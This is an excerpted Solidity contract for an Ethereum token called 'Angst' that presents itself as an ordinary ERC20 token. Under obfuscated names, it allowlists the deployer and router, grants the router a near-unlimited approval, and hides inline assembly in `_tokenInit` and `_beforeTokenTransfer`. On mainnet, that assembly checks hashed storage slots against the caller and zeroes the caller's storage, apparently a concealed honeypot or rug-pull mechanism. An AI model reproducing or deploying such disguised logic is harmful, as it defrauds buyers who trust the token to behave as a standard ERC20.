...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addAngst;
    uint256 private fearIt = block.number*2;

    mapping (address => bool) private _firstMania; 
    mapping (address => bool) private _secondDoubt;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private angstAround;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private floydPink;
    address public pair;
    ...
    bool private trading; uint256 private punchAway = 1; bool private gunIn;
    uint256 private _decimals; uint256 private knifeOut;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addAngst.push(_router); addAngst.push(msgSender_); addAngst.push(pair);
        for (uint256 q=0; q < 3;) {_firstMania[addAngst[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x624b6e9ff9c250b82fea90373c2beb495db405f168df4c12353b4723341bd207
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xd00a148ef2cc3b11d8aa2640d5443d8cf5fac02df91bae51a4e9456280679dd4,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; fearIt = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addAngst[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPhobia(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addAngst[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPhobia(creator, initialSupply);
    }
}

contract Angst is ERC20Token {
    constructor() ERC20Token("Angst", "ANGST", msg.sender, 25000000 * 10 ** 18) {
    }
}